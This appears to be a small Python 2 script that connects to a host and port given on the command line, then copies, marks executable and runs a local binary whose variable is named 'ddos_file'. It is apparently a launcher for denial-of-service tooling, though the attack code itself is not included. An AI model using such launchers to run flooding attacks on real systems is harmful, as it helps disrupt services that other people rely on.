#!/usr/bin/python

from socket import *
from subprocess import *
import sys
import time
import shutil
import os
import signal

g_child_proc = 0

def sig_handler(signun, frame):
	g_child_proc.kill()
	sys.exit(1)

def copy_add_set_exec(src, dst):
	shutil.copyfile(src, dst)
	os.chmod(dst, 0755)

if len(sys.argv) != 3:
	print "wrong parameter number!"
	sys.exit(-1)	

ip = sys.argv[1]
port = int(sys.argv[2])

s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, port))

time.sleep(2)

ddos_file = "./a.out"
tmp_file = ddos_file+".bak"

copy_add_set_exec(ddos_file, tmp_file)


signal.signal(signal.SIGINT, sig_handler)
g_child_proc = Popen(tmp_file)

while True:
	time.sleep(10)
